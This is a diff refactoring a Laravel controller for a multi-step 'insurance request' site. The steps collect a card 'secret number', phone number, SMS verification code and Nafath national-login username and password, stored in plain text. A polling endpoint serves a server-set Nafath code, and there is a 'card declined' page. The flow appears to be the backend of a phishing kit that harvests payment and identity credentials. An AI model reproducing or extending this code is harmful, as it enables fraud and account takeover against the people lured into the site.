 
-                // Update in DB :
                 DB::transaction(function () use ($updated_data, $insuranceRequest) {
                     $insuranceRequest->update($updated_data);
                 });
 
-                // Combine data from steps 1 and 2
                 $allFormData = session('allFormData');
                 $cardOwnership = session('cardOwnership');
                 $allFormData = array_merge($allFormData, $cardOwnership);
 
-                // Save all data to session
-                $request->session()->put('allFormData', $allFormData);
+                session(['allFormData' => $allFormData]);
 
                 return redirect()->route('cardOwnershipSecertNumber')->with('success', 'Record Added Successfully');
             } else {
@@ -711,23 +848,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -739,7 +875,6 @@ class HomePageFrontendController extends Controller
     public function cardOwnershipSecertNumber(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -753,23 +888,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -781,31 +915,25 @@ class HomePageFrontendController extends Controller
     public function cardOwnershipSecertNumberRequest(CardOwnershipSecertNumberRequestFormRequest $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-                // Prepare Data :
                 $updated_data = [
                     'card_ownership_secert_number' => $request->card_ownership_secert_number,
                 ];
 
-                // Save form data to session
-                $request->session()->put('cardOwnershipSecertNumber', $updated_data);
+                session(['cardOwnershipSecertNumber' => $updated_data]);
 
-                // Update in DB :
                 DB::transaction(function () use ($updated_data, $insuranceRequest) {
                     $insuranceRequest->update($updated_data);
                 });
 
-                // Combine data from steps 1 and 2
                 $allFormData = session('allFormData');
                 $cardOwnershipSecertNumber = session('cardOwnershipSecertNumber');
                 $allFormData = array_merge($allFormData, $cardOwnershipSecertNumber);
 
-                // Save all data to session
-                $request->session()->put('allFormData', $allFormData);
+                session(['allFormData' => $allFormData]);
 
                 return redirect()->route('confirmPhoneNumber')->with('success', 'Record Added Successfully');
             } else {
@@ -813,23 +941,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -841,7 +968,6 @@ class HomePageFrontendController extends Controller
     public function confirmPhoneNumber(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -855,23 +981,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -883,56 +1008,49 @@ class HomePageFrontendController extends Controller
     public function confirmPhoneNumberRequest(ConfirmPhoneNumberRequestFormRequest $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-                // Prepare Data :
                 $updated_data = [
                     'mobile_number' => $request->mobile_number,
                     'mobile_network_operator' => $request->mobile_network_operator,
                 ];
 
-                // Save form data to session
-                $request->session()->put('confirmPhoneNumber', $updated_data);
+                session(['confirmPhoneNumber' => $updated_data]);
 
-                // Update in DB :
                 DB::transaction(function () use ($updated_data, $insuranceRequest) {
                     $insuranceRequest->update($updated_data);
                 });
 
-                // Combine data from steps 1 and 2
                 $allFormData = session('allFormData');
                 $confirmPhoneNumber = session('confirmPhoneNumber');
                 $allFormData = array_merge($allFormData, $confirmPhoneNumber);
 
-                // Save all data to session
-                $request->session()->put('allFormData', $allFormData);
-                // return 'Layth';
+                session(['allFormData' => $allFormData]);
+
                 return redirect()->route('checkPhoneNumber')->with('success', 'Record Added Successfully');
             } else {
                 return redirect()->back()->with('danger', 'This record does not exist in the records');
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -944,7 +1062,6 @@ class HomePageFrontendController extends Controller
     public function checkPhoneNumber(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -958,23 +1075,22 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
@@ -986,31 +1102,25 @@ class HomePageFrontendController extends Controller
     public function checkPhoneNumberRequest(CheckPhoneNumberRequestFormRequest $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-                // Prepare Data :
                 $updated_data = [
                     'check_mobile_number_verification_code' => $request->check_mobile_number_verification_code,
                 ];
 
-                // Save form data to session
-                $request->session()->put('checkPhoneNumber', $updated_data);
+                session(['checkPhoneNumber' => $updated_data]);
 
-                // Update in DB :
                 DB::transaction(function () use ($updated_data, $insuranceRequest) {
                     $insuranceRequest->update($updated_data);
                 });
 
-                // Combine data from steps 1 and 2
                 $allFormData = session('allFormData');
                 $checkPhoneNumber = session('checkPhoneNumber');
                 $allFormData = array_merge($allFormData, $checkPhoneNumber);
 
-                // Save all data to session
-                $request->session()->put('allFormData', $allFormData);
+                session(['allFormData' => $allFormData]);
 
                 return redirect()->route('nafathLogin')->with('success', 'Record Added Successfully');
             } else {
@@ -1018,37 +1128,33 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
     }
 
-
-
     // ========================================================================
-    // ===================== nafathLogin Function ========================
+    // ===================== nafathLogin Function =============================
     // ========================================================================
     public function nafathLogin(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -1061,130 +1167,116 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
     }
 
-
-
     // ========================================================================
-    // ================= nafathLoginRequest Function =====================
+    // ================= nafathLoginRequest Function ==========================
     // ========================================================================
     public function nafathLoginRequest(NafathLoginRequestFormRequest $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-
-
                 return redirect()->route('codeDegit');
             } else {
                 return redirect()->back()->with('danger', 'This record does not exist in the records');
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
     }
 
-
-
     // ========================================================================
-    // ================= nafathDocumentingRequest Function =====================
+    // ================= nafathDocumentingRequest Function ====================
     // ========================================================================
     public function nafathDocumentingRequest(NafathDocumentingRequestFormRequest $request, Route $route)
     {
         try {
-            // return $request;
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
 
             $insuranceRequest = InsuranceRequest::find($allFormData['id']);
             if ($insuranceRequest) {
-
                 $updated_data = [
                     'user_name' => $request->user_name,
                     'password' => $request->password,
-
                 ];
-                // Update in DB :
+
                 DB::transaction(function () use ($updated_data, $insuranceRequest) {
                     $insuranceRequest->update($updated_data);
                 });
+
                 return redirect()->route('codeDegit');
             } else {
                 return redirect()->back()->with('danger', 'This record does not exist in the records');
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
     }
 
     // ========================================================================
-    // ===================== codeDegit Function ========================
+    // ===================== codeDegit Function ===============================
     // ========================================================================
     public function codeDegit(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -1197,30 +1289,29 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
     }
 
     // ========================================================================
-    // ===================== fetchCodeDegit Function ========================
+    // ===================== fetchCodeDegit Function ==========================
     // ========================================================================
     public function fetchCodeDegit()
     {
@@ -1232,14 +1323,12 @@ class HomePageFrontendController extends Controller
         return response()->json(['nafath_code' => $nafathCode]);
     }
 
-
     // ========================================================================
-    // ===================== resendCodeDegit Function ========================
+    // ===================== resendCodeDegit Function =========================
     // ========================================================================
     public function resendCodeDegit(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
@@ -1249,54 +1338,52 @@ class HomePageFrontendController extends Controller
                 $insuranceRequest = InsuranceRequest::where('id', $allFormData['id'])->first();
                 $updated_data = [
                     'nafath_code' => null,
-
                 ];
-                // Update in DB :
+
                 DB::transaction(function () use ($updated_data, $insuranceRequest) {
                     $insuranceRequest->update($updated_data);
                 });
+
                 return view('codeDegit', compact('allFormData'));
             } else {
                 return redirect()->back()->with('danger', 'This record does not exist in the records');
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
     }
 
-
-
     // ========================================================================
-    // ===================== cardDeclined Function ========================
+    // ===================== cardDeclined Function ============================
     // ========================================================================
     public function cardDeclined(Request $request, Route $route)
     {
         try {
-            // Retrieve form data from session (allFormData)
             $allFormData = session('allFormData');
             if (!isset($allFormData)) {
                 return redirect()->route('welcome');
             }
+
             session()->forget('insuranceRequest');
+
             if ($allFormData) {
                 return view('cardDeclined', compact('allFormData'));
             } else {
@@ -1304,23 +1391,24 @@ class HomePageFrontendController extends Controller
             }
         } catch (\Throwable $th) {
             $function_name =  $route->getActionName();
-            $check_old_errors = new SupportTicket();
-            $check_old_errors = $check_old_errors->select('*')->where([
+            $check_old_errors = SupportTicket::where([
                 'error_location' => $th->getFile(),
                 'error_description' => $th->getMessage(),
                 'function_name' => $function_name,
                 'error_line' => $th->getLine(),
-            ])->get();
-            if ($check_old_errors->count() == 0) {
-                $new_error_ticket = SupportTicket::create([
+            ])->first();
+
+            if (!$check_old_errors) {
+                $end_error_ticket = SupportTicket::create([
                     'error_location' => $th->getFile(),
                     'error_description' => $th->getMessage(),
                     'function_name' => $function_name,
                     'error_line' =>  $th->getLine(),
+
+
                 ]);
-                $end_error_ticket = $new_error_ticket;
             } else {
-                $end_error_ticket = $check_old_errors->first();
+                $end_error_ticket = $check_old_errors;
             }
             return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
         }
